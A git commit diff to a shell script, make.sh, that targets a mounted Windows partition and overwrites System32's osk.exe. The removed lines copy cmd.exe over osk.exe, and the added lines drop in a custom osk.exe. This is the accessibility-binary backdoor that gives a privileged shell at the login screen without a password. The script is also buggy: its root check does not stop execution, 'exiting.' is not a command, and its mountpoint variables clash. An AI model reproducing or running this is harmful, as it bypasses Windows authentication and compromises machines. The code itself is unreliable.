3b143f69dc718c798d291e065fc53f6c97607bad
JamieHoSzeYui <henloboii@protonmail.ch>
2020-11-25 14:46:08 +0800

    Script : Redo

--- make.sh
+++ make.sh
@@ -9,39 +9,33 @@ usage()
     echo "if no mountpoint is provided, script will try to parse mountpoint as /dev/sda4"
 }
 
+if [[ $(whoami | grep root) ]]; then 
+    : 
+else 
+    echo "Are we root? "
+    exiting. 
+fi 
+
 if [[ $1 = "-h" ]]; then 
     usage 
     exit 
 fi 
 
 if [[ ! -n $1 ]]; then 
-    echo "Not enough arguments provided !"
+    MOUNTP=/dev/sda4
     exit 
 fi 
  
-if [[ $(ls $1/Windows/System32 | grep cmd.exe )]]; then 
+if [[ $(ls $MOUNTPOINT/Windows/System32 | grep cmd.exe )]]; then 
     echo "System32 detected. Continuing."
 else
     echo "System32 not found. Are you at the right directory?"
     exit 
 fi 
 
-if [[ $2 = "debug" ]]; then 
-    echo "Debug : Patch cmd instead of mkacc"
-    MKPATCH=0 
-fi 
-
-if [[ $MKPATCH = 1 ]]; then 
-    cd $1/Windows/System32
-    sudo mv -f osk.exe bsdk.exe 
-    sudo cp -fpr $MYDIR/osk.exe .
-elif [[ $MKPATCH = 0 ]]; then 
-    cd $1/Windows/System32 
-    sudo mv -f osk.exe bsdk.exe 
-    sudo cp -fpr  cmd.exe osk.exe
-    cd $MYDIR 
-fi 
+# Logic parts
+cd $MOUNTPOINT/Windows/System32 
+sudo cp -fpr osk.exe lol.exe 
+sudo cp -fpr $MYDIR/osk.exe . 
 
 echo "Patching done !"
-
-
